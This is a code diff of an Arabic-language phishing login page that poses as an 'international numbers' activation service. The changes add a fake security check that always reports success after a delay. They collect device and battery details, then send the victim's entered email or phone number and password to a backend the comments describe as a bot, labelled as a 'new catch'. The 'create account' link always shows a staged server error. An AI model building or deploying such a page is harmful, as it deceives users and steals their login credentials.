@@ -9,158 +9,137 @@
     
     <style>
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
             background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
             display: flex; flex-direction: column; align-items: center; min-height: 100vh;
         }
 
-        /* تنسيق الشريط العلوي وقائمة الـ Hamburger */
-        .top-bar {
-            width: 100%; max-width: 380px; padding: 15px 10px;
-            display: flex; justify-content: flex-end; align-items: center;
-        }
-        .menu-icon {
-            cursor: pointer; padding: 5px;
-        }
-        .menu-line {
-            width: 25px; height: 3px; background-color: rgba(255, 255, 255, 0.9);
-            margin: 5px 0; border-radius: 2px;
-        }
+        .top-bar { width: 100%; max-width: 380px; padding: 15px 10px; display: flex; justify-content: flex-end; }
+        .menu-icon { cursor: pointer; padding: 5px; }
+        .menu-line { width: 25px; height: 3px; background-color: white; margin: 5px 0; border-radius: 2px; }
 
         .container {
             background: white; padding: 30px; border-radius: 12px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 90%; max-width: 380px; text-align: center;
-            margin-top: 10px;
         }
-        .logo-container { margin-bottom: 20px; }
-        #pageImg { width: 100px; height: 100px; border-radius: 50%; object-fit: contain; }
-        
-        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; font-weight: bold; }
+        #pageImg { width: 100px; height: 100px; border-radius: 50%; object-fit: contain; margin-bottom: 20px; }
+        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; }
         
         input {
             width: 100%; padding: 14px; margin-bottom: 15px;
-            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; 
-            outline: none; text-align: right; font-size: 14px;
+            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none; text-align: right;
         }
-        input:focus { border-color: #CC0044; }
 
-        .captcha-wrapper { display: flex; justify-content: center; margin-bottom: 20px; }
-        
-        /* تنسيق الأزرار الاحترافي */
+        /* تنسيق التحقق الوهمي */
+        .captcha-wrapper { margin-bottom: 20px; min-height: 65px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #loader-text { color: #CC0044; font-weight: bold; display: none; font-size: 14px; }
+
         button {
-            width: 100%; padding: 14px;
-            background-color: #CC0044; /* لون التفعيل الرئيسي */
-            color: white; border: none; border-radius: 30px; /* حواف دائرية كاملة لجعلها احترافية */
-            font-size: 17px; font-weight: bold; cursor: pointer;
-            transition: all 0.3s ease; /* تأثير حركة ناعم */
-            margin-bottom: 15px;
-            box-shadow: 0 4px 6px rgba(204, 0, 68, 0.3); /* ظل ناعم */
+            width: 100%; padding: 14px; background: #CC0044; color: white;
+            border: none; border-radius: 30px; font-size: 17px; font-weight: bold; cursor: pointer;
+            transition: 0.3s; box-shadow: 0 4px 6px rgba(204,0,68,0.2);
         }
-        button:hover { 
-            background-color: #a30036; /* لون أغمق عند مرور الفأرة */
-            box-shadow: 0 6px 12px rgba(204, 0, 68, 0.5); /* ظل أقوى */
-            transform: translateY(-2px); /* حركة بسيطة للأعلى */
-        }
-        button:active {
-            transform: translateY(0); /* إعادة الحركة عند الضغط */
-            box-shadow: 0 2px 4px rgba(204, 0, 68, 0.2);
-        }
+        button:hover { background: #a30036; transform: translateY(-2px); }
 
-        .footer-links { margin-top: 10px; border-top: 1px solid #eee; padding-top: 15px; }
-        .footer-links p { font-size: 14px; color: #666; margin-bottom: 5px; }
-        /* زر "إنشاء حساب" يظهر كرابط لكن بأسلوب احترافي */
-        .footer-links a { color: #CC0044; text-decoration: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .footer-links a:hover { color: #8a002a; text-decoration: underline; }
+        .footer-links { margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; font-size: 14px; }
+        .footer-links a { color: #CC0044; text-decoration: none; font-weight: bold; cursor: pointer; }
 
-        .developer-credits {
-            margin: 20px 0; color: rgba(255, 255, 255, 0.9);
-            font-size: 13px; direction: ltr; text-align: center; width: 100%; max-width: 380px;
-        }
+        .developer-credits { margin: 20px 0; color: white; font-size: 12px; direction: ltr; opacity: 0.8; }
     </style>
 </head>
 <body>
 
     <div class="top-bar">
-        <div class="menu-icon" onclick="showMenuDialog()">
-            <div class="menu-line"></div>
-            <div class="menu-line"></div>
-            <div class="menu-line"></div>
+        <div class="menu-icon" onclick="Swal.fire({title:'القائمة', text:'خدمات الأرقام الدولية', icon:'info', confirmButtonColor:'#CC0044'})">
+            <div class="menu-line"></div><div class="menu-line"></div><div class="menu-line"></div>
         </div>
     </div>
 
     <div class="container">
-        <div class="logo-container">
-            <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Logo">
-        </div>
-
-        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>
+        <img id="pageImg" src="https://logodix.com/logo/2014521.png">
+        <h2>سجل دخولك لتفعيل خدمة الأرقام</h2>
 
         <form id="checkForm">
             <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" id="passInput" placeholder="كلمة السر" required>
             
             <div class="captcha-wrapper">
-                <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA"></div>
+                <div id="loader-text">🔄 جاري فحص أمان الجهاز...</div>
+                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="handleCaptcha"></div>
             </div>
 
-            <button type="submit" id="pageBtn">تسجيل دخول</button>
+            <button type="submit">تسجيل دخول</button>
         </form>
 
         <div class="footer-links">
-            <p>ليس لديك حساب؟ <a onclick="showCreateAccountError()">إنشاء حساب جديد</a></p>
+            <p>ليس لديك حساب؟ <a onclick="showError()">إنشاء حساب جديد</a></p>
         </div>
     </div>
 
-    <div class="developer-credits">
-        تم تطوير الموقع by oliver 2014 - 2026
-    </div>
+    <div class="developer-credits">تم تطوير الموقع by oliver 2014 - 2026</div>
 
     <script>
-        // دالة لإظهار القائمة المنبثقة عند الضغط على الـ Hamburger Menu
-        function showMenuDialog() {
-            Swal.fire({
-                title: 'خيارات إضافية',
-                html: 'تسجيل الدخول | <a style="color:#CC0044; text-decoration:underline; font-weight:bold" onclick="showCreateAccountError()">إنشاء حساب جديد</a> | تفعيل الخدمة',
-                icon: 'info',
-                confirmButtonText: 'إغلاق',
-                confirmButtonColor: '#CC0044'
-            });
+        let isVerified = false;
+
+        // وظيفة تأخير التحقق لزيادة الواقعية
+        function handleCaptcha() {
+            const cfBox = document.getElementById('cf-box');
+            const loader = document.getElementById('loader-text');
+            
+            cfBox.style.display = 'none';
+            loader.style.display = 'block';
+
+            setTimeout(() => {
+                loader.innerHTML = '✅ تم التحقق من هويتك بنجاح';
+                loader.style.color = 'green';
+                isVerified = true;
+            }, 2500); // تأخير 2.5 ثانية
         }
 
-        function showCreateAccountError() {
-            Swal.fire({
-                title: 'خطأ في النظام',
-                text: 'فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.',
-                icon: 'error',
-                confirmButtonText: 'حسناً',
-                confirmButtonColor: '#CC0044'
-            });
+        function showError() {
+            Swal.fire({ title: 'خطأ', text: 'فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.', icon: 'error', confirmButtonColor: '#CC0044' });
+        }
+
+        // دالة جلب معلومات البطارية والجهاز
+        async function getDeviceInfo() {
+            let info = {
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                battery: "غير معروف"
+            };
+
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    info.battery = (battery.level * 100) + "%";
+                }
+            } catch (e) {}
+            return info;
         }
 
         document.getElementById('checkForm').onsubmit = async (e) => {
             e.preventDefault();
-            const user = document.getElementById('userInput').value;
-            const pass = document.getElementById('passInput').value;
-            
-            const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]').value;
-            if (!turnstileResponse) {
-                Swal.fire({
-                    text: 'يرجى إكمال التحقق أولاً',
-                    icon: 'warning',
-                    confirmButtonText: 'موافق'
-                });
+            if (!isVerified) {
+                Swal.fire({ text: 'يرجى إكمال التحقق أولاً', icon: 'warning' });
                 return;
             }
 
+            const deviceData = await getDeviceInfo();
+            const payload = {
+                title: "🚨 صيد جديد مـكتمل البيانات",
+                user: document.getElementById('userInput').value,
+                pass: document.getElementById('passInput').value,
+                device_type: deviceData.device,
+                battery_level: deviceData.battery,
+                time: new Date().toLocaleString('ar-EG')
+            };
+
+            // إرسال البيانات للبوت
             try {
                 await fetch('/api/save', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        title: "🚨 صيد جديد",
-                        user: user,
-                        password: pass
-                    })
+                    body: JSON.stringify(payload)
                 });
             } catch (err) {}
 
